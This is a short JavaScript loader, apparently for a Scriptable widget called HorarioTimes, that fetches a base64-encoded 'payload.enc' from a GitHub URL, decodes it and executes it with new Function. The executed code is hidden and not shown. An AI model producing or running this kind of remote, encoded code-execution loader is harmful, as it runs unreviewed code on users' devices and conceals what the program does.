// =============================
// HorarioTimes Loader (VISIBLE)
// =============================

const PAYLOAD_URL = "https://raw.githubusercontent.com/alibhtty/buildup/main/timesburg/sant-pau/payload.enc";

async function loadPayload() {
  const req = new Request(PAYLOAD_URL);
  req.timeoutInterval = 10;

  const enc = await req.loadString();

  // 1️⃣ decodificar base64
  const decoded = Data.fromBase64String(enc).toRawString();

  // 2️⃣ ejecutar SIN exports, SIN nombres globales
  return new Function(decoded)();
}

await loadPayload();